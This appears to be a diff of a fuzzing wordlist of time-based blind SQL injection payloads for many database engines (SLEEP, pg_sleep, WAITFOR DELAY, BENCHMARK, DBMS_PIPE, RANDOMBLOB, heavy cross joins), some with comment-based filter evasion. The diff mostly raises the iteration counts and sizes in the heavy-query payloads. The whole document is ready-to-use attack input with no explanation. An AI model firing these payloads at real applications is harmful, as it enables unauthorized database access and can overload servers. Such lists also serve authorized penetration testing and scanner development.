@@ -1,5 +1,5 @@
 
-  or benchmark(10000000,MD5(1))-- -
+  or benchmark(20000000,MD5(1))-- -
   or pg_sleep(5)# xx
  AND (SELECT 7170 FROM (SELECT(SLEEP(20)))1337)
  AND (SELECT 7170 FROM (SELECT(SLEEP(20)))1337)-- dqGz
@@ -9,19 +9,19 @@
  AND 8699=(SELECT 8699 FROM PG_SLEEP(20))-- 1337
  WAITFOR DELAY '0:0:20'
  WAITFOR DELAY '0:0:20'-- SEYg
- or benchmark(10000000,MD5(1))#
+ or benchmark(20000000,MD5(1))#
  or pg_sleep(5)--
  waitfor delay '0:0:5' --
  waitfor delay '0:0:5' /* 
-" AND "xxqwx"=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)-- 923ur
-" AND "xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- 345f
+" AND "xxqwx"=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)-- 923ur
+" AND "xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- 345f
 " AND (SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 5 END))-- kjkew
-" AND (SELECT (CASE WHEN (5=5) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL) ELSE 'xxqwx' END) FROM (VALUES(0)))
+" AND (SELECT (CASE WHEN (5=5) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL) ELSE 'xxqwx' END) FROM (VALUES(0)))
 " AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 " AND (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- -
 " AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- xxv
 " AND (SELECT 7170 FROM (SELECT(SLEEP(20)))1337) AND "oFyV"="oFyV
-" AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -
+" AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))-- -
 " AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND "1337"="1337
 " AND 5=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- -cc
 " AND 5=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- -
@@ -30,11 +30,11 @@
 " AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND "1337"="1337
 " AND pg_SLEEP(5)-- c
 " AND waitfor delay "00:00:05"-- -
-" OR "xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- fiuif
-" OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- jurewr
-" OR 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,6000000))
+" OR "xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- fiuif
+" OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))-- jurewr
+" OR 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000))
 " OR 5=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--  8djhjsad
-" OR 5=BENCHMARK(6000000,MD5('xxqwx'))-- -
+" OR 5=BENCHMARK(20000000,MD5('xxqwx'))-- -
 " OR 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- -
 " OR 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- eee
 " OR RLIKE SLEEP(6)-- -
@@ -44,9 +44,9 @@
 " XOR(if(now()=sysdate(),sleep(5*5),0))OR "
 " or SLEEP(5)--
 " or SLEEP(5)="
-" or benchmark(10000000,MD5(1))#
-" or benchmark(10000000,MD5(1))-- -
-" or benchmark(50000000,MD5(1))# -
+" or benchmark(20000000,MD5(1))#
+" or benchmark(20000000,MD5(1))-- -
+" or benchmark(20000000,MD5(1))# -
 " or pg_sleep(5)#
 " or pg_sleep(5)--
 " or sleep(5)#
@@ -58,8 +58,8 @@
 ") AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND ("1337"="1337
 ") AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND ("1337"="1337
 ") WAITFOR DELAY "0:0:20" AND ("1337"="1337
-") or benchmark(10000000,MD5(1))#
-") or benchmark(10000000,MD5(1))-- -
+") or benchmark(20000000,MD5(1))#
+") or benchmark(20000000,MD5(1))-- -
 ") or pg_sleep(5)#--
 ") or pg_sleep(5)--
 ") or sleep(5)="
@@ -70,8 +70,8 @@
 ")) AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND (("1337"="1337
 ")) AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND (("1337"="1337
 ")) WAITFOR DELAY "0:0:20" AND (("1337"="1337
-")) or benchmark(10000000,MD5(1))#
-")) or benchmark(10000000,MD5(1))-- -
+")) or benchmark(20000000,MD5(1))#
+")) or benchmark(20000000,MD5(1))-- -
 ")) or pg_sleep(5)# --
 ")) or pg_sleep(5)--
 ")) or sleep(5)="
@@ -97,8 +97,8 @@
 "))))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
 ")))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*/--
 ")))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
-"))/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-"))/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
+"))/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+"))/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
 "))/*azx*/or/*azx*/pg_sleep(5)#/*azx*/--
 "))/*azx*/or/*azx*/pg_sleep(5)--
 "))/*azx*/or/*azx*/sleep(5)="
@@ -108,8 +108,8 @@
 "));/*azx*/dbms_lock.sleep(5);/*azx*/end;/*azx*/--a
 "));waitfor delay '0:0:5'-- -
 "));waitfor/*azx*/delay/*azx*/'0:0:5'--/*azx*/-
-")/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-")/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
+")/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+")/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
 ")/*azx*/or/*azx*/pg_sleep(5)#--
 ")/*azx*/or/*azx*/pg_sleep(5)--
 ")/*azx*/or/*azx*/sleep(5)="
@@ -120,25 +120,25 @@
 ");/*azx*/dbms_lock.sleep(5);/*azx*/end;/*azx*/--yrt
 ");waitfor delay '0:0:5'-- -
 ");waitfor/*azx*/delay/*azx*/'0:0:5'--/*azx*/-
-"/*azx*/AND/*azx*/"xxqwx"=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)--/*azx*/923ur
-"/*azx*/AND/*azx*/"xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/345f
+"/*azx*/AND/*azx*/"xxqwx"=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)--/*azx*/923ur
+"/*azx*/AND/*azx*/"xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/345f
 "/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)/*azx*/ELSE/*azx*/5/*azx*/END))--/*azx*/kjkew
-"/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)/*azx*/ELSE/*azx*/'xxqwx'/*azx*/END)/*azx*/FROM/*azx*/(VALUES(0)))
+"/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)/*azx*/ELSE/*azx*/'xxqwx'/*azx*/END)/*azx*/FROM/*azx*/(VALUES(0)))
 "/*azx*/AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))bAKL)/*azx*/AND/*azx*/'vRxe'='vRxe
 "/*azx*/AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))ecMj)--/*azx*/-
 "/*azx*/AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))nQIP)--/*azx*/xxv
-"/*azx*/AND/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--/*azx*/-
+"/*azx*/AND/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))--/*azx*/-
 "/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/ALL_USERS/*azx*/T1,ALL_USERS/*azx*/T2,ALL_USERS/*azx*/T3,ALL_USERS/*azx*/T4,ALL_USERS/*azx*/T5)--/*azx*/-cc
 "/*azx*/AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSIBM.SYSTABLES/*azx*/AS/*azx*/T1,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T2,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T3)--/*azx*/-
 "/*azx*/AND/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/-d
 "/*azx*/AND/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/xxxx
 "/*azx*/AND/*azx*/pg_SLEEP(5)--/*azx*/c
 "/*azx*/AND/*azx*/waitfor/*azx*/delay/*azx*/"00:00:05"--/*azx*/-
-"/*azx*/OR/*azx*/"xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/fiuif
-"/*azx*/OR/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--/*azx*/jurewr
-"/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,6000000))
+"/*azx*/OR/*azx*/"xxqwx"=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/fiuif
+"/*azx*/OR/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))--/*azx*/jurewr
+"/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,20000000))
 "/*azx*/OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSIBM.SYSTABLES/*azx*/AS/*azx*/T1,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T2,SYSIBM.SYSTABLES/*azx*/AS/*azx*/T3)--/*azx*//*azx*/8djhjsad
-"/*azx*/OR/*azx*/5=BENCHMARK(6000000,MD5('xxqwx'))--/*azx*/-
+"/*azx*/OR/*azx*/5=BENCHMARK(20000000,MD5('xxqwx'))--/*azx*/-
 "/*azx*/OR/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/-
 "/*azx*/OR/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/eee
 "/*azx*/OR/*azx*/RLIKE/*azx*/SLEEP(6)--/*azx*/-
@@ -146,9 +146,9 @@
 "/*azx*/SLEEP(5)="
 "/*azx*/or/*azx*/SLEEP(5)--
 "/*azx*/or/*azx*/SLEEP(5)="
-"/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-"/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
-"/*azx*/or/*azx*/benchmark(50000000,MD5(1))#/*azx*/-
+"/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+"/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
+"/*azx*/or/*azx*/benchmark(20000000,MD5(1))#/*azx*/-
 "/*azx*/or/*azx*/pg_sleep(5)#
 "/*azx*/or/*azx*/pg_sleep(5)--
 "/*azx*/or/*azx*/sleep(5)#
@@ -166,14 +166,14 @@
 &&SLEEP(5)--
 ' && SLEEP(5) && '1
 ' (select*from(select(sleep(7*7)))a) '
-' AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)-- 923ur
-' AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)-- rje
-' AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- fjdhfj
+' AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)-- 923ur
+' AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)-- rje
+' AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- fjdhfj
 ' AND (SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 5 END) FROM DUAL)-- -ekrjke
 ' AND (SELECT (CASE WHEN (5=5) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 5 END))-- dddd
 ' AND (SELECT (CASE WHEN (5=5) THEN DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6) ELSE 5 END) FROM DUAL)--77gd
-' AND (SELECT (CASE WHEN (5=5) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL) ELSE 'xxqwx' END) FROM (VALUES(0)))
-' AND (SELECT (CASE WHEN (5=5) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),600000000),NULL) ELSE 'xxqwx' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- -7673hh
+' AND (SELECT (CASE WHEN (5=5) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL) ELSE 'xxqwx' END) FROM (VALUES(0)))
+' AND (SELECT (CASE WHEN (5=5) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),2000000000),NULL) ELSE 'xxqwx' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- -7673hh
 ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 ' AND (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- -
 ' AND (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- xx
@@ -182,47 +182,47 @@
 ' AND (SELECT 5 FROM PG_SLEEP(6))-- -
 ' AND (SELECT 7170 FROM (SELECT(SLEEP(20)))1337) AND 'oFyV'='oFyV
 ' AND (select 99999999 from pg_sleep(15)) as test-- -
-' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- jfdfk
+' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))-- jfdfk
 ' AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND '1337'='1337
 ' AND 5=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- bb
 ' AND 5=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- -
-' AND 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,6000000))-- gg--
+' AND 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000))-- gg--
 ' AND 5=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- -
 ' AND 5=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- j4k3
 ' AND 5=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- -
-' AND 5=BENCHMARK(6000000,MD5('xxqwx'))-- -
+' AND 5=BENCHMARK(20000000,MD5('xxqwx'))-- -
 ' AND 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- -
 ' AND 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- -d
 ' AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND '1337'='1337
 ' AND BEGIN IF (5=5) THEN DBMS_LOCK.SLEEP(6); ELSE DBMS_LOCK.SLEEP(0); END IF; END;-- uuu
-' AND PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)-- -
-' AND RANDOMBLOB(1000000000/2)-- -
+' AND PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)-- -
+' AND RANDOMBLOB(2000000000/2)-- -
 ' AND SLEEP(5) AND '1
 ' AND SLEEP(5)-- -
 ' AND WAITFOR DELAY '0:0:6'-- -
-' AND benchmark(50000000,MD5(1))-- ddd
+' AND benchmark(20000000,MD5(1))-- ddd
 ' AND pg_SLEEP(5)-- c
 ' AND waitfor delay '00:00:05
 ' AND waitfor delay '00:00:05'# dd
 ' AND waitfor delay '00:00:05'-- -d
-' OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)-- rheu
-' OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- -wfewf
-' OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- fiuif
+' OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)-- rheu
+' OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- -wfewf
+' OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- fiuif
 ' OR (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
 ' OR (SELECT 5 FROM (SELECT(SLEEP(6)))xxqwx)
-' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,6000000))-- -
+' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000))-- -
 ' OR (select 99999999 from pg_sleep(15))-- -jfhjsdhfj
-' OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- jurewr
+' OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))-- jurewr
 ' OR 5=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- -w
 ' OR 5=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- a
 ' OR 5=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- -
 ' OR 5=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)-- -xxx
-' OR 5=BENCHMARK(6000000,MD5('xxqwx'))
+' OR 5=BENCHMARK(20000000,MD5('xxqwx'))
 ' OR 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- ee
 ' OR 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- fsd
-' OR RANDOMBLOB(500000000/2)-- -
+' OR RANDOMBLOB(200000000/2)-- -
 ' OR SLEEP(6)# fdfdf
-' PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)-- -
+' PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)-- -
 ' SLEEP(5)--
 ' SLEEP(5)='
 ' WAITFOR DELAY '0:0:20' AND '1337'='1337
@@ -231,9 +231,9 @@
 ' XOR(if(now()=sysdate(),sleep(5*5*0),0))OR '
 ' or SLEEP(5)-- tt
 ' or SLEEP(5)='
-' or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))-- -
-' or benchmark(50000000,MD5(1))--
+' or benchmark(20000000,MD5(1))#
+' or benchmark(20000000,MD5(1))-- -
+' or benchmark(20000000,MD5(1))--
 ' or pg_sleep(5)# --
 ' or pg_sleep(5)--
 ' or sleep(5)#
@@ -248,8 +248,8 @@
 ') AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND ('1337'='1337
 ') AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND ('1337'='1337
 ') WAITFOR DELAY '0:0:20' AND ('1337'='1337
-') or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))-- -
+') or benchmark(20000000,MD5(1))#
+') or benchmark(20000000,MD5(1))-- -
 ') or pg_sleep(5)#
 ') or pg_sleep(5)--
 ') or sleep(5)-- -
@@ -261,8 +261,8 @@
 ')) AND 3199=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(74)||CHR(115)||CHR(122),20) AND (('1337'='1337
 ')) AND 8699=(SELECT 8699 FROM PG_SLEEP(20)) AND (('1337'='1337
 ')) WAITFOR DELAY '0:0:20' AND (('1337'='1337
-')) or benchmark(10000000,MD5(1))#
-')) or benchmark(10000000,MD5(1))-- -
+')) or benchmark(20000000,MD5(1))#
+')) or benchmark(20000000,MD5(1))-- -
 ')) or pg_sleep(5)# --
 ')) or pg_sleep(5)--
 ')) or sleep(5)-- -
@@ -291,8 +291,8 @@
 '))))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
 ')))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*/--
 ')))/*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
-'))/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-'))/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
+'))/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+'))/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
 '))/*azx*/or/*azx*/pg_sleep(5)#/*azx*/--
 '))/*azx*/or/*azx*/pg_sleep(5)--
 '))/*azx*/or/*azx*/sleep(5)--/*azx*/-
@@ -313,8 +313,8 @@
 ')/*any*/ANd/*any*/8023=(SElEcT/*any*/8023/*any*/FroM/*any*/Pg_sleep(20))/*any*/ANd/*any*/('1337'='1337
 ')/*any*/AnD/*any*/3065=DBMS_PIPE.recEiVE_messAGE(cHr(111)||cHr(83)||cHr(81)||cHr(81),20)/*any*/AnD/*any*/('1337'='1337
 ')/*any*/WAITFOR/*any*/DELAY/*any*/'0:0:20'/*any*/And/*any*/('1337'='1337
-')/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
-')/*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
+')/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
+')/*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
 ')/*azx*/or/*azx*/pg_sleep(5)#
 ')/*azx*/or/*azx*/pg_sleep(5)--
 ')/*azx*/or/*azx*/sleep(5)--/*azx*/-
@@ -337,14 +337,14 @@
 '/*any*/WAITFOR/*any*/DELAY/*any*/'0:0:20'/*any*/AnD/*any*/'1337'='1337
 '/*azx*/&&/*azx*/SLEEP(5)/*azx*/&&/*azx*/'1
 '/*azx*/(select*from(select(sleep(7*7)))a)/*azx*/'
-'/*azx*/AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)--/*azx*/923ur
-'/*azx*/AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)--/*azx*/rje
-'/*azx*/AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/fjdhfj
+'/*azx*/AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)--/*azx*/923ur
+'/*azx*/AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)--/*azx*/rje
+'/*azx*/AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/fjdhfj
 '/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/ALL_USERS/*azx*/T1,ALL_USERS/*azx*/T2,ALL_USERS/*azx*/T3,ALL_USERS/*azx*/T4,ALL_USERS/*azx*/T5)/*azx*/ELSE/*azx*/5/*azx*/END)/*azx*/FROM/*azx*/DUAL)--/*azx*/-ekrjke
 '/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)/*azx*/ELSE/*azx*/5/*azx*/END))--/*azx*/dddd
 '/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)/*azx*/ELSE/*azx*/5/*azx*/END)/*azx*/FROM/*azx*/DUAL)--77gd
-'/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)/*azx*/ELSE/*azx*/'xxqwx'/*azx*/END)/*azx*/FROM/*azx*/(VALUES(0)))
-'/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),600000000),NULL)/*azx*/ELSE/*azx*/'xxqwx'/*azx*/END)/*azx*/FROM/*azx*/INFORMATION_SCHEMA.SYSTEM_USERS)--/*azx*/-7673hh
+'/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)/*azx*/ELSE/*azx*/'xxqwx'/*azx*/END)/*azx*/FROM/*azx*/(VALUES(0)))
+'/*azx*/AND/*azx*/(SELECT/*azx*/(CASE/*azx*/WHEN/*azx*/(5=5)/*azx*/THEN/*azx*/REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),2000000000),NULL)/*azx*/ELSE/*azx*/'xxqwx'/*azx*/END)/*azx*/FROM/*azx*/INFORMATION_SCHEMA.SYSTEM_USERS)--/*azx*/-7673hh
